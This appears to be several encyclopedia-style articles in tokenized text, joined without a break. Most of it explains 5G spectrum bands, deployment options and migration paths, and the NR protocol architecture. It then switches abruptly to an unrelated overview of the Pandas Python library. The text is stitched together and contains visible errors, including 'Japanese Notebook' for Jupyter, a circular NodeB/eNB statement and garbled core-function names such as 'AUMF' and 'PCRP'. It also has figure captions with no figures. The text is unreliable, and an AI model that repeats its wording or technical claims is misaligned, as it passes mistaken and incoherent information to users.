FR1 defines bands in the sub-6 GHz spectrum ( although 7125 MHz is the maximum ) and FR2 defines bands in the mmWave spectrum .
Because of the higher carrier frequencies in FR2 , it has a higher maximum bandwidth .
Bandwidths include 5 - 100 MHz ( FR1 ) and 50/100/200/400 MHz ( FR2 ) .
Correspondingly , valid subcarrier spacing values are also different : 15/30/60 kHz ( FR1 ) and 60/120 kHz ( FR2 ) .
In FR2 , 240 kHz subcarrier spacing is allowed for only SS / PBCH with valid bandwidths 100/200/400 MHz .
The Downlink MIMO differs between 8x8 ( FR1 ) and 2x2 ( FR2 ) .
FR1 caters for macro cells , high mobility and many users .
FR1 bands also experience multipath effects .
Higher - order MIMOs therefore enable spatial multiplexing and Multi - User MIMO ( MU - MIMO ) .
On the other hand , FR2 is for small cells , low mobility and a few users .
Multipath effects are less pronounced than in FR1 .
Lower - order MIMO therefore enables beamforming .
These differences imply that spectral efficiency is higher in FR1 than in FR2 .
What 's the suitability of low , mid and high - bands for 5 G services ?
Use cases of 5 G low - band , mid - band and high - band .
Source : Adapted from Reply 2020 .
Lower frequencies have better range but offer lower data rates .
On the mmWave spectrum , we get high data rates but waves ca n't get through walls , trees or even glass .
Thus , there 's a tradeoff between coverage and speed .
It 's therefore good that 5 G spans a wide spectrum to suit many different use cases and deployment scenarios .
Low - band spectrum can offer rural coverage .
Strong indoor signals could help connect to IoT devices in smart buildings and underground parking lots .
High - band spectrum could be ideal for short - range communications in dense urban areas and within buildings .
It can cater to many high - value services in retail , healthcare , entertainment , and more .
They could involve AR / VR applications .
Serving thousands of users in a stadium , critical IoT applications or applications that need ultra low latency are more useful cases .
The mid - band spectrum is a compromise of both low - band and high - band spectra .
It could cover large neighbourhoods and even an entire city , but probably ca n't serve rural areas .
Smart city services can benefit from it , such as fleet management , transit services and vehicle communications .
What are some features that enhance the use of 5 G spectrum ?
It 's possible for 5 G to share the 4 G spectrum .
Called Dynamic Spectrum Sharing ( DSS ) , this is an attractive option for operators who do n't have licensed 5 G spectrum yet .
Instead of statically re - farming the spectrum , DSS allows operators to dynamically migrate more spectrum from 4 G to 5 G as more 5 G users come into the system .
The DSS requires only a software upgrade .
Supported since LTE Release 10 , Carrier Aggregation ( CA ) is enhanced in 5G. Multiple carriers within the same band or across bands can be combined to serve a single UE .
CA allows operators to achieve better capacity , throughput and coverage in mid - band and high - band spectra .
For example , low band FDD with DSS can be used in uplink for better coverage and a high band TDD in downlink for higher throughput and capacity .
Supported since LTE Release 12 , Dual Connectivity ( DC ) is enhanced in 5G. DC allows a UE to connect to two different cells possibly served by different gNBs .
It may be an LTE or 5 G cell .
Whereas user plane split happens at MAC for CA , it happens at PDCP for DC .
It 's also possible to combine CA and DC .
What 's the relevance of unlicensed bands for 5 G ?
Example scenarios of using unlicensed spectrum for 5G. Source : Qualcomm 2020b , slide 10 .
Cellular use of unlicensed spectrum started in LTE .
Its variants include LTE Unlicensed ( LTE - U ) , Licensed Assisted Access ( LAA ) and MulteFire .
In Release 16 , 5 G NR - U allowed the use of unlicensed spectrum .
In particular , NR - U supports both license - assisted and standalone use of unlicensed spectrum .
It supports the 5 GHz unlicensed band used by Wi - Fi and LAA .
It also opens up unlicensed spectrum in the 6 GHz band .
Unlicensed spectrum in the mmWave band is being studied for Release 17 .
Since licensed spectrum is limited , for very high bandwidth applications , aggregating with unlicensed spectrum is an attractive approach .
Shared / unlicensed spectrum can enable local / private networks and Industrial IoT applications .
With Anchored NR - U , operators can employ carrier aggregation with 5 G NR or dual connectivity with LTE .
In urban hotspots , campuses and malls , this can deliver a consistent user experience .
With Standalone NR - U , operators will find it easier to deploy private networks .
Harmonization of bands for IMT at WRC-15 .
Source : Ericsson 2015 , slide 4 .
At the World Radiocommunication Conference 2015 ( WRC-15 ) , delegates agreed on additional spectrum for International Mobile Telecommunications ( IMT ) .
This includes C - band that later becomes a globally harmonized spectrum for 5G. Spectrum evolution from LTE to 5 G , including current study items .
Source : Szydelko and Dryjanski 2016 , table 2 .
Szydelko and Dryjanski publish an evolution of spectrum from LTE to 5G. Spectrum below 6 GHz and mmWave spectrum are being considered for 5G. For CA , 700 MHz is being considered for SDL .
This is standardized in Release 16 ( July 2020 ) .
In the US , the old 600 MHz TV spectrum has been re - farmed for LTE and 5G. Source : Qualcomm 2020a , slide 5 .
In the US , the FCC auctions the 600 MHz spectrum currently used by TV stations .
This spectrum will be used for LTE and 5 G , with the transition expected to take 39 months .
In July 2020 , it 's reported that 99 % of the migration is complete .
Ericsson claims the world 's first 5 G data call using Dynamic Spectrum Sharing ( DSS ) in low band FDD .
In February 2020 , with vendors Ericsson , Huawei and Qualcomm , Vodafone proved Dynamic Spectrum Sharing ( DSS ) in the low bands 700 MHz and 800 MHz on a non - standalone device .
In June 2020 , AT&T deploy the DSS .
Meanwhile , Nokia has claimed that the DSS is nothing new to it .
Years ago , it achieved 2G-4 G DSS in which low - band GSM spectrum was used to expand LTE service .
At the World Radiocommunication Conference 2019 ( WRC-19 ) , delegates met and agreed towards harmonization of the 5 G spectrum .
In particular , 24.25 - 27.5 , 37 - 43.5 , 45.5 - 47 , 47.2 - 48.2 and 66 - 71 GHz are identified .
This translates to 17.25 GHz of spectrum compared to only 1.9 GHz available before this conference .
Of this , 14.75 GHz of spectrum has been harmonized worldwide , reaching 85 % of global harmonization .
The next meeting will be WRC-23 in 2023 .
The Global mobile Suppliers Association ( GSA ) reports that 97 operators in 17 countries have public licenses to operate 5 G service on mmWave spectrum .
Of these , 22 operators are already operational , with 24.25–29.5 GHz being the most common band .
Unlicensed spectrum for 5G. Source : Qualcomm 2020a , slide 3 .
3GPP finalizes Release 16 specifications .
This release adds many more bands to FR1 .
In FR2 , n259 ( 39500 - 43500 MHz ) is added .
This release also adds NR - U for operation in unlicensed spectrum .
Count of operators investing in 5 G spectrum bands .
Source : GSA 2020 , fig .
1 .
GSA reports that operators are showing most interest in n77 and n78 ( mid - band ) ; n257 , n258 and n260 ( mmWave ) ; and n28 ( low - band ) .
The GSA website is also the place to track the latest in 5 G spectrum news .
In the US , the FCC puts up for auction 280 MHz of spectrum in the range 3.7 - 3.98 GHz , known as C - band .
A successful bidder will likely purchase 100 MHz of contiguous mid - band spectrum .
Compared to mmWave , C - band has better propagation properties , making this an important auction for 5 G operators .
Summary of 5 G deployment options .
Source : Cagenius et al .
2018 .
Though 5 G has been standardized , it has a number of options .
Two network operators can deploy 5 G in very different ways .
This choice of option depends on the spectrum licensed to an operator , the geographic area they serve ( terrain and user density ) , capabilities of the equipment they use , and business factors ( cashflow and decision making ) .
3GPP has defined options covering both 4 G and 5 G technologies with respect to Radio Access Network ( RAN ) and Core Network ( CN ) .
These options can guide operators as they migrate from current 4 G deployments to 5 G deployments .
It 's generally expected that operators would first deploy 5 G NR , let 4 G RAN and 5 G NR coexist , and finally deploy 5 G Core .
This implies that 4G+5 G handsets would come out first and they would connect to both 4 G ENB and 5 G gNB .
What are the broad challenges in deploying a 5 G network ?
Ideally , an operator acquires 5 G licenses , invests in 5 G equipment for both RAN and CN , and deploys the network for full coverage .
The operator then asks subscribers to switch to 5G. After a short transition period , the old 4 G network is retired .
In reality , subscribers may be slow to migrate since they have to invest in 5G - capable handsets .
The operator 's 5 G subscription plans may be costlier .
The 5 G network may have poor coverage in many areas where it 's been deployed in only the mmWave band .
An incumbent operator has most likely invested heavily in 4 G licenses and equipment .
Their current 4 G licenses may be in spectrum bands not supported by 5G. Perhaps the equipment they use ca n't easily be upgraded to 5G. It 's also possible that the government has delayed the auctioning of 5 G spectrum .
Operators do n't want to wait .
They may want to offer 5 G services on a 4 G licensed spectrum .
Even with 5 G licenses , they would want 4 G to coexist with 5 G and steadily migrate to 5 G as more 5 G subscribers are added .
Which are the main 5 G deployment options ?
Six deployment options for 5G. Source : GSMA 2018 , fig .
1 .
In LTE , both RAN and CN had to use LTE standards .
5 G gives more flexibility .
For example , 4 G RAN can be combined with 5 G Core or 5 G NR can be combined with 4 G EPC .
This gives rise to two broad deployment scenarios : Standalone ( SA ) : Uses only one radio access technology , either LTE radio or 5 G NR .
Both control and user planes go through the same RAN element .
Deployment and network management is perhaps simpler for operators .
Inter - RAT handover is needed for service continuity .
Under SA , we have option 1 ( EPC + 4 G eNB ) , option 2 ( 5GC + 5 G gNB ) , and option 5 ( 5GC + 4 G ng - eNB ) .
Non - Standalone ( NSA ) : Multiple radio access technologies are combined together .
The control plane goes through what 's called the master node , whereas the data plane is split across the master node and a secondary node .
There 's tight interworking between 4 G RAN and 5 G NR .
Under NSA , we have option 3 ( EPC + 4 G eNB master + 5 G en - gNB secondary ) , option 4 ( 5GC + 5 G gNB master + 4 G ng - eNB secondary ) , and option 7 ( 5GC + 4 g ng - eNB master + 5 g gNB secondary ) .
What are the differences between options 3 , 3a and 3x ?
Comparing options 3 , 3a and 3x .
Source : Adapted from Rabie 2019 .
In all three options , the control plane is between EPC and eNB via S1-C interface , and eNB and gNB via X2-C interface .
There 's no direct signalling traffic between EPC and GNB .
The differences are in how user plane traffic is routed .
Below we describe the downlink but it applies to uplink as well .
In option 3 , user plane traffic is from EPC to eNB where the PDCP sublayer splits the traffic so that some traffic is sent to gNB across the X2-U interface .
In option 3a , the EPC has a direct S1-U interface to gNB .
In this option , the EPC splits the traffic .
Option 3x is a hybrid : EPC splits the traffic for eNB and gNB , and/or gNB PDCP sublayer sends some traffic to eNB .
For example , eMBB services use 5 G NR whereas VoLTE uses LTE radio .
gNB connected to an EPC via S1-U is more specifically called en - gNB .
It 's part of E - UTRA - NR Dual Connectivity ( EN - DC ) .
The interface between en - gNB and eNB is also called Xx interface .
Similar variations of routing user plane traffic involving 5 G Core give rise to options 4a , 7a and 7x .
Could you compare possible migration paths from 4 G to 5 G ?
Comparing different 4G - to-5 G migration paths .
Source : GSMA 2018 , fig .
1 .
Since options 1 and 3 use EPCs , they ca n't support many 5 G use cases .
It 's been noted that there 's no real 5 G without 5 G Core .
However , option 3 enables faster time - to - market since the core network can be upgraded later .
Due to 5 G NR , users can experience better throughput .
However , with this increased traffic , the EPC may become a bottleneck .
Traffic flow is split at the EPC .
From NSA option 3 , the operator can migrate to NSA option 7 or SA option 5 .
With both these options , 5GC enables all 5 G services .
eNB and en - gNB are upgraded to ng - eNB and gNB respectively to connect to 5GC .
Option 3 will continue to support UEs that ca n't talk to 5GC .
It 's also possible to add SA option 2 to complement NSA option 3 .
An alternative path is to deploy SA option 2 from the outset , thus immediately enabling all 5 G use cases .
However , operators have to acquire and deploy 5 G equipment .
Ideally , NR coverage is achieved over a wide area .
Otherwise , frequent inter - RAT handover to SA option 1 or NSA option 3 may occur .
What scenarios can benefit from 5 G deployment options 4 , 5 and 7 ?
Comparing 5 G deployment options 5 , 7 and 4 .
Source : Nokia 2018 , table 3 .
Options 4 , 5 and 7 enable operators to continue using legacy 4 G equipment while connecting to 5GC .
With the higher bandwidths of options 4 and 7 , all 5 G use cases are possible .
Migration paths 3→5 , 3→7 , 3→4 + 2 , 3→4 , 7→4 , 5→4 , 1→4 , 1→7 , and 4→2 have been suggested .
For some , option 5 is not attractive .
Legacy 4 G UEs have to be replaced .
eNB has to be upgraded substantially .
Lots of interoperability testing is needed .
If UE moves out of 5 G NR coverage ( option 2 ) , traditional MBB / voice use cases can be supported simply with option 1 and inter - RAT handover .
In the long term , improving option 2 coverage is a better path .
Option 7 depends on option 5 and inherits the same problems .
Option 4 is an extension of option 2 .
Using dual connectivity , LTE radio is added to the 5 G NR anchor .
This improves coverage and bandwidth .
However , it requires an upgrade to eNB , gNB and UE , along with necessary interoperability testing .
Instead , it would be better to focus on improving option 2 coverage .
Could you highlight the differences between eNB , gNB , ng - eNB and en - gNB ?
RAN network elements for each 5 G deployment option .
Source : Mpirical 2020 , fig .
1 .
3 G 's NodeB ( NB ) has evolved to NodeB ( eNB ) in 4G. In 5 G , this has evolved to the next generation NodeB ( gNB ) .
ng - eNB and en - gNB are variations of eNB and gNB respectively , depending on CN .
We compare the different RAN elements : eNB : A 4 G network element .
Connects to a 4 G UE and EPC .
This relates to options 1 and 3 .
gNB : A newly introduced 5 G network element .
Connects to a 5 G UE and 5 G Core .
This relates to options 2 , 4 and 7 .
en - gNB : Sits on a 4 G RAN and connects a 5 G UE to EPC .
Both 4 G and 5 G radio resources are active using dual connectivity .
eNB is the master node while en - gNB is the secondary node .
" en " refers to E - UTRA New Radio .
This relates to option 3 .
ng - eNB : Connects to 5 G Core but serves 5 G UE over 4 G radio .
" ng " refers to Next Generation .
This relates to options 4 , 5 and 7 .
There 's dual connectivity in option 4 ( gNB is master , ng - eNB is secondary ) and option 7 ( ng - eNB is master , gNB is secondary ) .
How do 5 G deployment options map to spectrum bands ?
Migration path from 4 G to 5 G across spectrum bands .
Source : Cagenius et al .
2018 .
Current 4 G deployments might be in sub-1GHz and 1 - 3GHz bands .
5 G NR is then deployed in the mmWave band and possibly in mid - bands 3.5 - 8GHz .
This brings higher throughput / capacity / density and lower latency .
At the same time , 4 G RAN ensures good wide - area coverage and serves subscribers who have n't migrated to 5G. With Dual Connectivity ( DC ) , high - band NR downlink can be combined with low - band 4 G uplink .
More throughput can be achieved via inter - band Carrier Aggregation ( CA ) .
This is option 3 .
When the operator activates 5 G Core , option 2 comes into play .
Initially , this will be limited to 5 G NR in mmWave band and mid - bands 3.5 - 8GHz for Fixed Wireless Access ( FWA ) and industrial deployments .
At a later time , when 4 G spectra are re - farmed , or via spectrum sharing , option 2 can be deployed to wider areas .
When a UE moves out of option 2 5 G NR coverage , it triggers intersystem handover to EPC , either in option 3 or 1 .
Even when 5 G is widely deployed , for Massive Machine Type Communications ( mMTC ) , NB - IoT and LTE - M will be used in option 1 .
What 's a possible migration path from LTE EPC to 5 G Core ?
4 G to 5 G core network migration .
Source : Samsung 2019 , fig .
3 - 2 .
As an example , we describe Samsung 's offering .
They claim that their LTE EPC is already virtualized and provides Control and User Plane Separation ( CUPS ) .
For 5 G NSA , EPC software is upgraded for dual connectivity .
For 5 G SA , EPC Network Elements ( NEs ) become 5GC Network Functions ( NFs ) .
Specifically , GW - C , GW - U , HSS and PCRP are upgraded to SMF , UPF , UDM and PCF respectively .
New NFs AMF , NRF , NSSF , NEF and UDF are introduced .
LTE 's MME functionality goes into AMF , SMF and AUMF .
The final deployment is a common core that covers LTE , 5 G and Wi - Fi .
5 G Core is a Service - Based Architecture ( SBA ) .
NFs will be virtualized in the cloud and implemented using microservices and containers .
LTE 's stateful NEs that store UE state will be replaced with stateless NFs .
Increasingly , cloud native architecture will be used with lightweight - containers .
There will be centralized orchestration of containers , network slicing , centralized operation , and centralized analytics .
Overall , network control , monitoring and optimization will be automated .
This will be the biggest impact of moving from LTE EPC to 5 G Core .
3GPP publishes Release 15 " early drop " .
This includes NSA option 3 .
Corrections to this option will be made in June 2018 .
Korea Telecom 's 4 G to 5 G migration plan .
Source : GSMA 2018 , fig .
13 .
GSMA 's report shares Korea Telecom 's 4 G to 5 G migration plan .
Early deployments are likely to be NSA option 3 with 5 G NR only in the 28GHz mmWave band .
As 5GC gets introduced , multi - RAT interworking will become important .
5 G NR coverage will improve with the 3.5GHz band .
NSA option 7 would be used , with eLTE being the anchor .
Finally , EPCs will be retired .
3GPP publishes Release 15 " main drop " .
This includes SA option 2 and SA option 5 .
Comparing 5 G deployment options 3X and 2 .
Source : Nokia 2018 , table 2 .
A white paper by Nokia recommends either option 3 or option 2 for initial 5 G rollout .
The report also identifies option 3X in which high bandwidth traffic flows are routed to 5 G gNB to avoid overloading 4 G eNB .
LTE user plane ( SGW / PGW ) would require performance improvements and a distributed architecture .
3GPP publishes Release 15 " late drop " .
This includes SA option 4 and SA option 7 .
5 G defines a new radio interface called 5 G New Radio ( NR ) .
Rather than being something new , it should be seen as an evolution of LTE technology .
In fact , the term Next Generation Radio Access Network ( NG - RAN ) is commonly used and it covers both 5 G NR and LTE / E - UTRA radio access .
5 G attempts to address many new use cases not possible in earlier generations .
5 G NR plays an important role in fulfilling these new cases .
All layers of the 5 G NR protocol stack are enhanced , but perhaps most changes are within PHY .
While there are many 3GPP specifications that define 5 G NR , beginners can start with TS 38.300 and TS 38.401 that give high - level descriptions .
Which are the 5 G NR technical enablers for achieving 5 G use cases ?
Key features and benefits of 5 G NR .
Source : Nokia Networks , via Ghosh 2018 , slide 2 .
The three broad 5 G use cases supported by 5 G NR are Enhanced Mobile Broadband ( eMBB ) , Massive Machine - Type Communications ( mMTC ) and Ultra - Reliable Low - Latency Communications ( URLLC ) .
5 G NR spans spectra from sub - GHz to mmWave bands .
This enables deployments of macro cells to picocells .
Both licensed and unlicensed bands are allowed .
Wide bandwidths at mmWave bands enable eMBB .
Multiple bands can be combined to offer higher data rates and boost capacity .
For URLLC , reliability is improved via multi - antenna transmission , multiple carriers and packet duplication .
Latency is reduced by mini - slot transmission , grant - free uplink access , and eMBB resource pre - emption .
Control and reference signals appear at the start of a slot .
To cater to a wide range of bands and deployments , OFDM Sub - Carrier Spacing ( SCS ) is flexible while maintaining time - domain alignment .
As SCS goes up , the slot duration shrinks .
For example , a wider SCS might suit URLLC and a narrower SCS for MBB / mMTC .
There are many ways to aggregate slots with guard periods between uplink and downlink .
Thus , we can have short transmissions for URLLC and longer ones for eMBB .
What are the key design principles behind 5 G NR ?
5 G NR adopts an ultra - lean design .
Source : Nokia Networks , via Ghosh 2018 , slide 6 .
We identify the following : Flexibility : OFDM sub - carrier spacing and symbol duration are flexible such that services with different requirements of bandwidth and latency can coexist .
The design allows for a wide range of deployments , from outdoor macrocells to indoor picocells .
A wide spectrum from sub - GHz to mmWave bands are supported .
Symbol allocation within a slot is flexible .
Forward Compatibility : Design is such that it 's easy to introduce new use cases in future .
This is enabled by self - contained slots and beams , that is , they can be decoded without dependency on other slots or beams .
This also relates to design flexibility : details are configured at runtime rather than fixed in specifications .
Ultra - Lean Design : LTE transmits regular reference signals , synchronization signals and system broadcasts .
5 G is designed to minimize such " always on " transmissions .
This improves network energy efficiency and reduces interference in high traffic load conditions .
This also assists forward compatibility .
Another related approach is device - centric mobility .
A mobile phone sends out periodic reference signals that a base station measures , rather than monitoring reference signals from many nearby cells .
What 's the architecture of 5 G NR ?
Overall architecture of 5 G NG - RAN .
Source : ETSI 2020a , fig .
4.1 - 1 .
The Next Generation Radio Access Network ( NG - RAN ) consists of gNB and ng - eNB .
gNB serves 5 G UE over 5 G New Radio ( NR ) , a new air interface developed for 5G. gNB connects to 5 G Core , though some can connect to 4 G EPC as well .
ng - eNB connects to 5 G Core but serves 5 G UE over E - UTRA radio .
gNB and ng - eNB are interconnected via the Xn interface .
In the user plane , Xn uses GTP - U over UDP / IP .
On the control plane , Xn uses XnAP over SCTP .
Thus , signalling packets have guaranteed delivery whereas user plane packets do n't .
Xn - U does data forwarding and flow control .
Xn - C facilitates UE mobility management and dual connectivity .
5 G NR nodes connect to 5 G Core via NG interface .
Like Xn , NG - U uses GTP - U over UDP / IP , and NG - C uses NG - AP over SCTP .
More specifically , NG - U connects to the User Plane Function ( UPF ) and NG - C connects to the Access and Mobility Management Function ( AMF ) in the core .
NG - C and NG - U are also called N2 and N3 interfaces respectively .
What 's the 5 G NR protocol stack ?
5 G NR protocol stacks .
Source : ETSI 2020a , sec .
4.4 .
The air interface between the UE and GNB is usually described in two planes : the User Plane ( UP ) : Carries user data .
It consists of PHY , MAC , RLC , PDCP and SDAP .
SDAP is new in 5 G ( does n't exist in LTE ) .
Control Plane ( CP ) : Carries signalling such as sending system broadcasts , paging UEs , establishing connection , handover , measurement reporting , NAS messaging , etc .
It consists of PHY , MAC , RLC , PDCP and RRC .
In addition , the UE has a Non - Access Stratum ( NAS ) layer that terminates on the network side in the 5 G Core .
PHY is commonly called Layer 1 .
MAC / RLC / PDCP / SDAP are called sub - layers of Layer 2 .
When transmitting , SDAP maps QoS flows to data radio bearers .
PDCP maps ( data or signalling ) radio bearers to RLC channels .
RLC maps RLC channels to logical channels .
MAC does the scheduling and maps logical channels to transport channels .
PHY maps transport channels to physical channels .
When receiving , the layers map in the opposite direction .
What are the key principles or features of NG - RAN ?
NG - RAN features ( left ) and 5GC features ( right ) .
Source : ETSI 2020a , fig .
4.2 - 1 .
An essential principle of NG - RAN is the logical separation of signalling and data transport networks .
NG - RAN and 5GC functions are separated from transport functions , even if they happen to reside in the same equipment .
The Mobility of an RRC connection is fully controlled by NG - RAN .
NG - RAN nodes can be further disaggregated into Radio Unit ( RU ) , Distributed Unit ( DU ) and Centralized Unit ( CU ) .
By locating these parts at cell site or on cloud edge , different deployment options are possible .
Operators can decide based on the use case , CAPEX and OPEX .
3GPP has standardized the F1 interface between gNB - DU and gNB - CU , the W1 interface between ng - eNB - DU and ng - eNB - CU , and the E1 interface between gNB - CU - CP and gNB - CU - UP .
Other industry bodies might standardize the RU - DU interface .
NG - RAN has many functions : Radio Resource Management ( RRM ) ; routing of packets to AMF or UPF ; encryption and integrity protection of data ; IP and Ethernet header compression ; connection setup and release ; scheduling and transmission of system broadcasts and paging ; QoS flow management ; radio access network sharing ; dual connectivity ; support of network slicing ; and more .
What role does each protocol layer play in NG - RAN ?
Downlink user plane L2 structure .
Source : ETSI 2020a , fig .
6.7 - 1 .
SDAP maps a QoS flow to a data radio bearer .
It 's not relevant to the control plane .
PDCP does header compression / decompression using ROHC or EHC protocols .
It encrypts / decrypts packets .
It adds / checks the integrity of packets .
It supports both in - order and out - of - order delivery .
It discards duplicates .
RLC supports three transmission modes : Transparent Mode ( TM ) , Unacknowledged Mode ( UM ) , and Acknowledged Mode ( AM ) .
An RLC entity 's functions are based on its mode .
In AM , there 's error correction through ARQ , duplicate detection and error detection .
In AM and UM , SDUs can be segmented and there 's sequence numbering ; plus , SDUs can be discarded .
MAC maps SDUs from one or more logical channels to transport channels .
It does padding .
It does error correction through HARQ , one per Component Carrier ( CC ) .
It prioritizes transmission towards UEs ( downlink only ) , across logical channels of a UE , and UE resources .
Among the PHY procedures are link adaption , power control , cell search , random access , and HARQ .
PHY processing includes code block segmentation and CRC attachment , LDPC coding , rate matching , scrambling , modulation , layer mapping , and mapping to assigned resources and antenna ports .
How do 5 G NR L2 sub - layers differ from LTE 's E - UTRA sub - layers ?
SDAP is new in 5 G NR .
The 5 G Core can configure different QoS requirements for different IP flow of a PDU session .
SDAP maps IP flows to data radio bearers that can provide the necessary QoS. PDCP does packet duplication when sending , and reordering and duplicate detection when receiving .
This is done to satisfy URLLC case .
PDCP also includes integrity protection for user plane data .
Unlike LTE , RLC does n't concatenate with RLC SDUs since something similar is done on MAC .
Likewise , 5 G RLC does n't do reordering since the reordering done at PDCP is deemed adequate .
MAC carries signalling for beam management done at PHY .
Whereas LTE RRC has only two states ( Idle and Connected ) , 5 G RRC includes Inactive as an additional state .
This enables devices to save power and quickly reconnect with minimal signalling .
UE can also request specific system information instead of NG - RAN periodically sending the same .
What are the enhancements to 5 G NR in Release 16 ?
A summary of 5 G NR enhancements in Release 16 .
Source : Qualcomm 2020 , slide 8 .
We summarize the main enhancements : MIMO : MU - MIMO support of higher rank , multiple transmission and reception points ( multi - TRP ) , better multi - beam management ( useful in mmWave band ) , and extended uplink coverage ( full power UL transmission ) .
URLLC : Using Coordinated Multi - Point ( CoMP ) , reliability is improved .
CoMP uses multi - TRP .
Improved HARQ , flexible scheduling , inter - device service multiplexing and intra - device channel prioritization are other changes .
Time - Sensitive Networking ( TSN ) : For industrial automation , TSN provides time - deterministic delivery of data packets .
Power Save : Wakeup Signal ( WUS ) lets a device skip the next low - power DRX ( discontinuous reception ) monitoring period .
Integrated Access and Backhaul ( IAB ) : IAB allows a base station to provide wireless backhaul to neighbouring base stations .
NR - U : 5 G can operate on unlicensed spectrum , either with a licensed / shared spectrum as anchor or in standalone mode .
Non - Public Network ( NPN ) : For industrial IoT , private networks with small cells , dedicated resources and low latency are possible .
Cellular - Vehicle - to - Everything ( C - V2X ) : NR - based sidelink is introduced .
Multicast groups are defined based on distance and applications .
Positioning : Meets the accuracy requirements of 3 meters ( indoor ) and 10 meters ( outdoor ) .
First drafts of two high - level documents , TS 38.300 : NR and NG - RAN Overall description ; Stage-2 and TS 38.401 : NR - RAN ; Architecture description are published .
3GPP approves the first specifications for 5 G , called " early drop " of Release 15 .
Specifically , it ratifies the Non - Standalone ( NSA ) 5 G New Radio ( NR ) specification .
This enables vendors to start implementing the first 5 G products .
NSA 5 G will allow operators to leverage existing 4 G infrastructure .
However , it ca n't support some use cases that require ultra - low latency and higher capacity .
Also part of Release 15 , and called " main drop " , 3GPP approves many specifications for 5 , G , including the Standalone ( SA ) option .
This allows operators without 4 G networks to offer 5 G service .
3GPP approves " late drop " of Release 15 .
This might aid in migrating from 4 G to 5 G , or NSA 5 G to SA 5G. However , some vendors and operators do n't see this as essential since Release 16 or 17 specifications could offer alternatives .
3GPP finalizes Release 16 specifications .
This adds support for unlicensed spectrum .
It improves latency , power consumption , positioning and cellular - to - vehicle connectivity .
Existing features enhanced by Release 16 include MIMO , beamforming , Dynamic Spectrum Sharing ( DSS ) , Dual Connectivity ( DC ) and Carrier Aggregation ( CA ) .
Pandas logo .
Source : Pandas 2021 .
Pandas is a Python package that enables in - memory data manipulation and analysis .
It offers many ways to read and store data .
It can inspect , clean , filter , merge , combine or transform data to suit the needs of analysis .
By mid-2010s , it had become an essential tool in the data scientist 's toolkit .
Pandas is built on another popular Python package called NumPy .
NumPy and Pandas data structures have become common formats that many Python packages tend to support .
Pandas is an open - source BSD - licensed project sponsored by NumFOCUS .
Pandas is often seen as Python 's answer to similar capabilities in the R language .
Why do I need Pandas when there 's NumPy ?
Comparing Python list , NumPy ndarray and Pandas DataFrame .
Source : Wang 2019 .
NumPy has multi - dimensional arrays that are optimized for numerical computation .
NumPy supports element - wise mathematical operations on arrays ( addition , division , cosine ) and dot product of arrays .
Arrays can be transposed , combined , sliced and indexed in flexible ways .
Array content can be aggregated ( sum , min , max , mean ) .
Pandas are built on top of NumPy .
It can therefore do everything that NumPy can do .
In fact , it 's easy to convert between Pandas and NumPy data structures , both of which can be used within the same codebase .
In addition , Pandas offers methods that simplify data analysis .
NumPy is n't flexible or easy to use for statistical work .
A NumPy array must contain values of the same type , which is not common in real - world data .
Pandas are better suited for tabular data .
Consider data stored on a spreadsheet or a database .
It 's typical to give unique labels to rows and columns .
Accessing data using these labels makes it easier to write and maintain code .
For this reason , Pandas has much better support for reading from or writing to CSV / JSON / Excel / HDF5 / HTML files and MySQL databases .
Could you describe some used cases of Pandas ?
Time series analysis using Pandas and Matplotlib .
Source : Walker 2019 .
We can use Pandas for data inspection and profiling .
We can view a small sample of the dataset .
Data is described using basic statistics : mean , median , mix , max , etc .
Profiling can point out missing or duplicate values , or correlations among variables .
Pandas Profiling is a package that does this automatically .
Another task for a data scientist is Exploratory Data Analysis ( EDA ) .
This is done to gain insights into the data and identify possible input features before any modelling is done .
Pandas fits nicely with the interactive and iterative nature of EDA .
DataPrep.eda is an EDA tool built on top of Pandas .
Before training a machine learning model , Pandas can simplify data preparation .
For example , categorical labels are converted to numerical values .
Missing values are replaced with mean or median values .
The predicted variable is separated from the rest of the dataset .
Data is merged , sorted , grouped , filtered , reshaped , etc .
Time Series Analysis ( TSA ) is another use case of Pandas .
Pandas have data types to handle date / time values .
It can do time - based indexing , time zone handling , resampling , rolling windows , and trend analysis .
Which are the main features of Pandas ?
An overview of Panda features .
Source : DataFlair 2019a .
We note the following important features : Data Structures : Inspired by R 's ` data.frame ` , ` DataFrame ` is a good fit for storing and manipulating tabular data .
This includes indices on rows and labels on columns .
There 's also ` Series ` ( 1D vectors ) and ` Panel ` ( 3D tables ) .
Input / Output : Pandas can read / write data between memory and various file formats .
For example , reading from a CSV file is just two lines of code whereas this in Java would need 30 lines .
Indexing : Data can be indexed in many ways .
Hierarchical indexing allows intuitive access to high - dimensional data .
Manipulation : Pandas can reshape or pivot data .
It 's easy to add or remove columns .
Different datasets can be merged or automatically aligned based on the indices .
Aggregations and even more sophisticated " group by " operations common with SQL database tables are possible .
Missing Data : These can be either ignored , dropped or replaced depending on the operation .
There are methods to detect the presence of missing data .
Time - Series Data : There 's support for date range generation , frequency conversion , moving windows statistics , date shifting and lagging .
Optimization : Critical code paths are optimized in Cython or C. How well is Pandas supported by other Python packages and tools ?
Explore Panda dataframes interactively using IPython widgets .
Source : Hirst 2016 .
Many well - known Python packages and tools understand or even specialize in Pandas ` DataFrame ` and ` Series ` .
Some of these include pandas - tfrecords , sklearn - pandas , Featuretools , Compose , Altair , Bokeh , Seaborn , qgrid , Spyder , pandas - datareader , PyDatastream , Geopandas , Blaze , Koalas , etc .
For visualization , matplotlib can directly read DataFrame type and create plots .
For machine learning , scikit - learn methods can read a dataframe , often by specifying the argument ` as_frame = True ` .
IPython understands and displays Pandas datasets in a more user - friendly manner .
Via package ipywidgets , we can interactively explore Pandas data frames within a Japanese Notebook environment .
Statsmodels is a package for econometrics and statistical modelling .
This package uses Pandas data structures .
It has historical links with the Panda development .
Pandas runs on a single CPU core .
With Dask , we can parallelize the computation on multiple cores or a cluster of machines .
Dask offers ` dask.dataframe ` that 's a composite of many Pandas DataFrames .
Dask APIs are also similar to Pandas APIs .
With RAPIDS CuDF , Pandas DataFrames can run on GPUs .
Computations run in parallel on many GPU cores .
What are some criticisms of Pandas ?
Memory management in Pandas could be better .
As a rule of thumb , Pandas requires 5 - 10x as much RAM as the dataset size .
There 's no native support for multicore execution .
There 's no support for memory mapping .
It 's therefore easy to copy an entire dataset by accident when analytics is done only on a small part of it .
Support for categorical data could be better .
Appending data to a DataFrame is slow .
It does n't have an SQL - like query processing layer .
Pandas is too tightly coupled to NumPy .
For example , an entire DataFrame column must be stored in the same NumPy array .
This frequently results in doubling memory requirements and additional computation .
